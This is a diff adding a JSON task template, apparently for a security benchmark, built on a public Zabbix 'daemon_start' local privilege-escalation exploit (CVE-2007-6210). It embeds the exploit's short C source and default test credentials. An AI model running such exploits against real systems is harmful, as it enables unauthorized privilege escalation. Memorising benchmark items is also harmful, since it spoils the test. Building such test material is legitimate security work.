@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_30839",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: Zabbix 1.1.4/1.4.2 - 'daemon_start' Local Privilege Escalation (CVE-2007-6210;OSVDB-42480)\n\nExploit source code (30839.c):\n```\n#include <sys/types.h>\n#include <unistd.h>\n#include <pwd.h>\n#include <stdio.h>\n\nint main()\n{\n     struct passwd *pw;\n     pw = getpwnam(\"abi\");\n     FILE *pipe;\n     char buf[25];\n     setgid(pw->pw_gid);\n     setuid(pw->pw_uid);\n\n     printf(\"my gid: %d\\n\", getegid());\n     printf(\"my uid: %d\\n\", getuid());\n\n     pipe = popen(\"/usr/bin/id\", \"r\");\n     while (fgets(buf, sizeof buf, pipe)) {\n             printf(\"%s\", buf);\n     }\n     printf(\"\\n\");\n     pclose(pipe);\n}\n```",
+  "cve": "CVE-2007-6210;OSVDB-42480",
+  "exploitdb_id": "30839",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_30839",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
